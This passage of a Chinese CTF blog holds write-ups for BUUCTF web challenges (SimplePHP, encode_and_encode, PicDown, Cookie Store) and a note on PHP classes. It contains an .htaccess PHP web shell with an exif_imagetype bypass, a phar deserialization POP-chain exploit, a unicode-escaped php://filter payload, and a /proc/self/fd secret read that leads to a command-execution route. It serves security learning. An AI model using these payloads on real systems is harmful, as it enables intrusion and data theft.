<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_GET[a]);?&gt;\</span><br></pre></td></tr></table></figure>

<p><strong>(2)绕过exif_imagetype()上传.htaccess</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define width 20</span><br><span class="line">#define height 10</span><br></pre></td></tr></table></figure>

<blockquote>
<p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：<br><code>#define test_width 16</code><br><code>#define test_height 7</code></p>
</blockquote>
<p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11741348.html">https://www.cnblogs.com/20175211lyz/p/11741348.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>PHP反序列化类的基础知识再学习</title>
    <url>/2021/06/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%86%8D%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总觉得自己的基础知识不是很扎实，导致在做题的过程速度很慢，也没有完整的整理过，所以这里把基础概念再整理一下</p>
<h2 id="类有什么"><a href="#类有什么" class="headerlink" title="类有什么"></a>类有什么</h2><p>类可以有常量、属性（也就是变量）、方法（也就是函数）</p>
<h2 id="什么是类"><a href="#什么是类" class="headerlink" title="什么是类"></a>什么是类</h2><p><strong>类是面向对象的基本概念，就是对现实中某一种类的事物的抽象</strong></p>
<p>比如手机可以抽象为一个类，具体属性有显示屏类型，显示屏帧率，处理器，内存规格，电池大小，快充功率，摄像头规格等。</p>
<p>可以有获取手机名称，打电话，玩游戏，看视频，聊天等操作方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phone</span></span>&#123;</span><br><span class="line"><span class="comment">//声明属性</span></span><br><span class="line">    $name=<span class="string">&#x27;手机&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getPhoneName</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="什么是对象"><a href="#什么是对象" class="headerlink" title="什么是对象"></a>什么是对象</h2><p><strong>对象是异类食物的一个具体事例：比如这部手机</strong></p>
<p>对象通过new关键字实例化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$phone &#x3D;new Phone();&#x2F;&#x2F;实例化一个手机对象</span><br><span class="line">$phone-&gt;name &#x3D;&#39;iphone&#39;;&#x2F;&#x2F;给手机名称赋值</span><br><span class="line">echo $phone-&gt;getPhoneName();&#x2F;&#x2F;调用getPhoneName的方法</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>类是抽象的概念，对象是具体的实例，类使程序具有重用性，就是可以被其他类继承</p>
<h2 id="什么是属性"><a href="#什么是属性" class="headerlink" title="什么是属性"></a>什么是属性</h2><p><strong>类的变量成员即为属性</strong></p>
<h2 id="伪变量-this"><a href="#伪变量-this" class="headerlink" title="伪变量$this"></a>伪变量$this</h2><p><strong>$this 的含义是表示实例化后的具体对象</strong></p>
<p>举个例子:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phone</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user=<span class="keyword">new</span> phone;</span><br><span class="line">$user-&gt;name=<span class="string">&#x27;iphone&#x27;</span>;</span><br><span class="line">$user-&gt;getname();</span><br><span class="line"><span class="comment">//echo iphone;</span></span><br></pre></td></tr></table></figure>

<h2 id="一点体会"><a href="#一点体会" class="headerlink" title="一点体会"></a>一点体会</h2><p>我们的class 是类，我们后面的$XXX=new xxx;是实例化一个对象，对象是这个XXX！我们实例化了这个对象，他就具有了类的相关性质，我们可以进行调用。</p>
]]></content>
  </entry>
  <entry>
    <title>buuctf19</title>
    <url>/2021/06/18/buuctf19/</url>
    <content><![CDATA[<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>一开始就先看看源码之类的 发现flag在flag.php</p>
<p>然后查看文件这里有个?file=什么 感觉可以文件包含,成功拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    $temp = explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>用了白名单过滤，所以暂时没有什么好的绕过方法<br>于是看看文件包含能不能继续走，发现一个class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="comment">#将str赋值为name</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>文件上传+序列化——&gt;phar反序列化，所以此时思路就来了<br>接下来开始研究一下如何上传<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210614191633.png" alt="img" style="zoom:67%;"></p>
<p><del>这是怕我们做不出来 还特意给了提示吧，分析一下pop链如何构造</del><br><del>最后哟个file_get_contents这应该是我们的最终利用点了，从后往前推，是value被查，所value的赋值来自get里面的params[$key]，那我们就需要让key的值来自get的赋值，所以我们需要使用到get这个魔术方法，使用条件为读取不可访问或不存在的属性时跳转，往前看 show的set里面有个key，想要跳转到set的条件是，对不可访问或不存在的属性进行复制，那么value又要从哪里来？所以这里好像行不通，我们换个思路，我们要使用get这个魔术方法，就要看看哪里能调用不可访问或不存在的属性进行跳转，这个时候就看到tostring里面的str[‘str’]-&gt;source，我们此时将str[‘str’]赋值为test类，那么就会调用不存在的属性source，就会跳转到test的get中了，那么tostring那里会被调用了，除了show里面的construct我们要用来对file赋值以外，就是cle4r里面的destruct了接下来正式构造一波:</del></p>
<p>感觉对于这里的思路很乱，于是尝试重新理顺一下思路：</p>
<p>pop链的构造首先需要找到头和尾，头就是传入的地方，尾就是最终执行的地方</p>
<blockquote>
<p>本题中的尾巴就是file_get_contents，头就是我们的phar</p>
</blockquote>
<p>从尾部倒退，我们要执行file_get()就要执行get()，那么就需要执行__get，即调用不存在或不可访问的属性，那么我们在哪里可以调用不存在或不可访问的属性呢？</p>
<blockquote>
<p>to_string中使用了str[‘str’]调用了source，而source是test中没有的属性，所以我们可以将str[‘str’]赋值为test</p>
</blockquote>
<p>但是问题又来了，to_string 如何调用呢？那么就需要找到将类转化为字符串输出的地方</p>
<blockquote>
<p>在__destruct中有个echo $this-&gt;test这里我们如果将test为show类，那么就会调用show类里面的to_string了</p>
</blockquote>
<p>整体的思路如上</p>
<p>接下来就写一下具体的构造链条:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> C1e4r();</span><br><span class="line">$b=<span class="keyword">new</span> Show();</span><br><span class="line">$c=<span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;str=$b;</span><br><span class="line">$b-&gt;str[<span class="string">&#x27;str&#x27;</span>]=$c;</span><br><span class="line">$c-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;exp.gif&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:5:&quot;C1e4r&quot;:2:&#123;s:4:&quot;test&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;file&quot;;N;s:6:&quot;params&quot;;a:1:&#123;s:6:&quot;source&quot;;s:22:&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&quot;;&#125;&#125;&#125;&#125;&#125; </span><br></pre></td></tr></table></figure>

<p>以上即可构造成功，但是这题是phar 我们还需要加点内容</p>
<p>接下来就是改一下后缀诶gif之类的图像后缀，上传文件 然后使用phar:解析了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210615115307.png" alt="img" style="zoom:67%;"></p>
<p>如上所示，在这里可以看到文件名，所以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;67e9350f1ef6ad63c902075576c35210.jpg</span><br></pre></td></tr></table></figure>

<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>本题是常规的phar反序列化题目</p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">#使用php伪协议接受数据，意味着我们可以post内容</span></span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);<span class="comment">#对于我们post的内容进行解码</span></span><br><span class="line"><span class="comment">#检查是否有黑名单的内容</span></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">&#x27;page&#x27;</span>];<span class="comment">#解码出来以后需要有page标签</span></span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]); </span><br></pre></td></tr></table></figure>

<p>看到题目 又看到过滤了那么多内容，第一时间想到的是会不会有什么字符串解析漏洞<br>先分析一下源码吧:<br>好了分析完毕，其实思路很简单，就是通过json的一些解析漏洞构造特殊编码形式绕过is_valid检查，<strong>而且很关键的是is_valid针对的是body的检查，而不是被解码后的json检查</strong>，然后再file_get_contents文件包含后再绕过一次，这里就很明显，肯定用php://filter base64加密就好了<br><a href="http://www.faqs.org/rfcs/rfc7159.html">http://www.faqs.org/rfcs/rfc7159.html</a><br>在这篇文章中，提到了一点：<br>如果遇到<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210621002852.png" alt="img" style="zoom:33%;"></p>
<p>所以这里用\u 也就是Unicode的编码形式进行绕过试试看：<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>额 成功了，感觉这题可能难度不大=-= 找找资料就行了</p>
<h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210621003754.png" alt="img" style="zoom:67%;">

<p>一开始看到url 感觉像是文件读取，于是就随便试了一下，发现可以下载文件，但是不知道怎么打开，于是抓包 发现直接就有flag了–<br>应该是非预期解<br>看了一下正规wp，果然~<br>首先/proc/self/cmdline读取当前运行文件进程<br>得到app.py，并读取获得源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, Response</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE &#x3D; &quot;&#x2F;tmp&#x2F;secret.txt&quot;</span><br><span class="line">f &#x3D; open(SECRET_FILE)</span><br><span class="line">SECRET_KEY &#x3D; f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#39;search.html&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;page&#39;)</span><br><span class="line">def page():</span><br><span class="line">    url &#x3D; request.args.get(&quot;url&quot;)</span><br><span class="line">    try:</span><br><span class="line">        if not url.lower().startswith(&quot;file&quot;):</span><br><span class="line">            res &#x3D; urllib.urlopen(url)</span><br><span class="line">            value &#x3D; res.read()</span><br><span class="line">            response &#x3D; Response(value, mimetype&#x3D;&#39;application&#x2F;octet-stream&#39;)</span><br><span class="line">            response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;beautiful.jpg&#39;</span><br><span class="line">            return response</span><br><span class="line">        else:</span><br><span class="line">            value &#x3D; &quot;HACK ERROR!&quot;</span><br><span class="line">    except:</span><br><span class="line">        value &#x3D; &quot;SOMETHING WRONG!&quot;</span><br><span class="line">    return render_template(&#39;search.html&#39;, res&#x3D;value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;no_one_know_the_manager&#39;)</span><br><span class="line">def manager():</span><br><span class="line">    key &#x3D; request.args.get(&quot;key&quot;)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    if key &#x3D;&#x3D; SECRET_KEY:</span><br><span class="line">        shell &#x3D; request.args.get(&quot;shell&quot;)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res &#x3D; &quot;ok&quot;</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; &quot;Wrong Key!&quot;</span><br><span class="line"></span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>分析一波：</strong></p>
<p>可以看到有三个路由 关键是第三个有个os.system可以执行shell<br>但是需要我们匹配密钥，但是在一开始就被删了，不过没关系，这个文件是用open打开的，会创建文件描述符。我们读这个文件描述符中的内容就好了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3</span><br></pre></td></tr></table></figure>

<p>/proc/[pid]/fd 是一个目录，包含进程打开文件的情况，所以我们打开self里面序号为3（3是fuzz出来的）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PyqGcLrhUhzQcdZiXqYiW+rUDJNn85fC9pMN3VEje7Q&#x3D;</span><br></pre></td></tr></table></figure>

<p>获得密钥，接下来就是进行连接<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210621005626.png" alt="img" style="zoom:67%;"><br>一开始尝试了一下 发现key不对，很纳闷，urlencode后就行了，发现有个+号被解析为空格了、、、有个小坑，后面的shell构造先留个坑，服务器买来好久没用了00忘记密码了，，，，</p>
]]></content>
  </entry>
  <entry>
    <title>buuctf20</title>
    <url>/2021/06/21/buuctf20/</url>
    <content><![CDATA[<p>之前的博客忘记保存了。。。。呜呜呜呜</p>
<h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>cookie伪造，session是很明显的base64编码，把钱更改一下，然后id更改一下就可以拿到flag了</p>
<h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>介绍一个工具:<br><a href="https://github.com/s0md3v/Arjun">Arjun</a>工具<br>使用python进行安装<br>简单介绍一下使用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 arjun -u http:&#x2F;&#x2F;25aa54c2-e825-4339-b4cf-b794f03a4221.node4.buuoj.cn&#x2F; -m get -c 150 -d 0.5</span><br></pre></td></tr></table></figure>

